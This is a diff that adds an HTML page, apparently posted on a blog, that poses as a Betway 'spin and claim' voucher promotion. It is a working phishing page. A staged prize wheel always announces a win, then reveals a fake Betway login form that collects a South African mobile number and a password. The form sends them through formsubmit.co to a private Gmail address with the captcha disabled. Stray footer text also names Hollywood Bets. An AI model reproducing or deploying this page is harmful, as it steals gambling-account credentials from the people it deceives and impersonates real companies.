@@ -1,0 +1,185 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Betway Voucher Spin</title>
+  <style>
+    body {
+      background-color: #FFFFFF;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      text-align: center;
+      padding: 20px;
+    }
+    h1 {
+      color: #00B140;
+      font-size: 36px;
+      margin-bottom: 10px;
+    }
+    p {
+      font-size: 18px;
+      color: #000;
+    }
+    #pointer {
+      width: 0;
+      height: 0;
+      margin: 10px auto;
+      border-left: 20px solid transparent;
+      border-right: 20px solid transparent;
+      border-bottom: 30px solid black;
+    }
+    #wheel {
+      width: 280px;
+      height: 280px;
+      margin: 10px auto 30px auto;
+      background-image: url('https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgM4L7Fx-EdqA8DRvhzbidQnYBra8hUFWHg4MwbsLnmzdBlGL4RLNsqT2d_IfkH_EY70xhfr_QWrffMxwK1PwOmsVMKrjg4EIwtigbPLfYd-buZDCxhv6gZ661pz-tgUvHwlDfAzcHgk1mJ-AImdAGqU-zoQ5mogUxuf14GUAOGeiNN_HX7RVc43BbjvS0z/s720/1000038148.png');
+      background-size: cover;
+      background-position: center;
+      border-radius: 50%;
+      transition: transform 4s cubic-bezier(0.33, 1, 0.68, 1);
+    }
+    button {
+      margin-top: 15px;
+      padding: 12px 25px;
+      background-color: #00B140;
+      color: #fff;
+      border: none;
+      border-radius: 6px;
+      font-size: 18px;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+    button:hover {
+      background-color: green;
+    }
+    #message {
+      margin-top: 20px;
+      font-size: 20px;
+      color: #000;
+    }
+    #loginForm {
+      display: none;
+      margin-top: 30px;
+    }
+    #loginForm h2 {
+      color: green;
+    }
+    #loginForm input {
+      display: block;
+      margin: 10px auto;
+      padding: 12px;
+      width: 90%;
+      max-width: 320px;
+      border-radius: 6px;
+      border: 1px solid #ccc;
+      color: black;
+    }
+    #loginForm a {
+      color: green;
+      font-size: 14px;
+      text-decoration: none;
+      display: block;
+      margin-top: 8px;
+    }
+    #loginForm a:hover {
+      color: blue;
+    }
+    #loginForm button {
+      background-color: green;
+      font-size: 17px;
+      margin-top: 15px;
+    }
+  </style>
+</head>
+<body>
+  <h1>Betway</h1>
+  <p id="preSpinText">Tap the wheel to win a free voucher!</p>
+  <button id="spinBtn">SPIN</button>
+  <div id="pointer"></div>
+  <div id="wheel"></div>
+  <div id="message"></div>
+  <button id="claimBtn" style="display:none;">Claim your voucher</button>
+
+  <div id="loginForm">
+    <h2>Login to Claim Voucher</h2>
+    <form action="https://formsubmit.co/letongwalapha@gmail.com" method="POST">
+      <input type="hidden" name="_captcha" value="false">
+      <label style="font-size: 16px;">Enter your details:</label>
+      <input type="number" name="phone" placeholder="+27 Mobile Number" required />
+      <input type="password" name="password" placeholder="Password" required />
+      
+      <a href="#">Forgot Password?</a> 
+      <button type="submit">Login</button>
+    </form>
+  </div>
+
+  <script>
+    const wheel = document.getElementById('wheel');
+    const spinBtn = document.getElementById('spinBtn');
+    const message = document.getElementById('message');
+    const claimBtn = document.getElementById('claimBtn');
+    const loginForm = document.getElementById('loginForm');
+    const pointer = document.getElementById('pointer');
+    const preSpinText = document.getElementById('preSpinText');
+
+    const prizeAngles = {
+      "R150": 90,
+      "R200": 210,
+      "R100": 330
+    };
+
+    const prizes = Object.keys(prizeAngles);
+    let spun = false;
+
+    spinBtn.onclick = () => {
+      if (spun) return;
+      spun = true;
+
+      const prize = prizes[Math.floor(Math.random() * prizes.length)];
+      const angle = prizeAngles[prize];
+      const rotation = 360 * 5 + angle;
+
+      wheel.style.transform = `rotate(${rotation}deg)`;
+
+      setTimeout(() => {
+        message.textContent = `You won ${prize}! Click below to claim.`;
+        claimBtn.style.display = 'inline-block';
+      }, 4000);
+    };
+
+    claimBtn.onclick = () => {
+      message.style.display = 'none';
+      wheel.style.display = 'none';
+      spinBtn.style.display = 'none';
+      claimBtn.style.display = 'none';
+      pointer.style.display = 'none';
+      preSpinText.style.display = 'none';
+      loginForm.style.display = 'block';
+    };
+  </script>
+</body>
+</html>
+<div class='post-bottom'>
+<div class='post-footer float-container'>
+<div class='post-footer-line post-footer-line-1'>
+</div>
+<div class='post-footer-line post-footer-line-2'>
+</div>
+<div class='post-footer-line post-footer-line-3'>
+</div>
+</div>
+<div class='post-share-buttons post-share-buttons-bottom invisible'>
+<div class='byline post-share-buttons goog-inline-block'>
+<div aria-owns='sharing-popup-Blog1-byline-7262804094899933247' class='sharing' data-title='BETWAY SPIN AND CLAIM'>
+<button aria-controls='sharing-popup-Blog1-byline-7262804094899933247' aria-label='Share' class='sharing-button touch-icon-button' id='sharing-button-Blog1-byline-7262804094899933247' role='button'>
+<div class='flat-icon-button ripple'>
+<svg class='svg-icon-24'>
+<use xlink:href='/responsive/sprite_v1_6.css.svg#ic_share_black_24dp' xmlns:xlink='http://www.w3.org/1999/xlink'></use>
+</svg>
+</div>
+</button>
+
+
+
+                             HOLLYWOOD BETS                                                              Welcome to BETWAY         Login into your BETWAY account to claim free voucher                                                             By logging in, you agree to our terms and conditions .                             
+</div>
